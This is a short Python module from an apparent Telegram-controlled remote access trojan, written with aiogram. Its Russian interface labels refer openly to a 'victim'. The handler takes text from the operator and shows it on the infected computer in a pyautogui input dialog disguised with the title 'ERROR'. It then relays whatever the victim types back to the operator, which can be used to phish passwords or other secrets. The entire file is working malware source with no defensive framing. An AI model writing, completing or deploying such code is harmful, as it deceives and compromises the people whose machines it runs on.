from loader import dp
from aiogram import types
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup


import pyautogui


class Form(StatesGroup):
    popap_text = State()


@dp.message_handler(text=['📝 Диалог'])
async def process_start_process_command(message: types.Message):
    await Form.popap_text.set()
    await message.answer("📝 Общение с жертвой.\n\n"
                         "♻️ Введите текст:")


@dp.message_handler(state=Form.popap_text)
async def process_name(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data['popap_text'] = message.text

    answer = pyautogui.prompt(data['popap_text'], "ERROR")
    await message.answer(f"🔹 Ответ жертвы:\n{answer}")
    await state.finish()
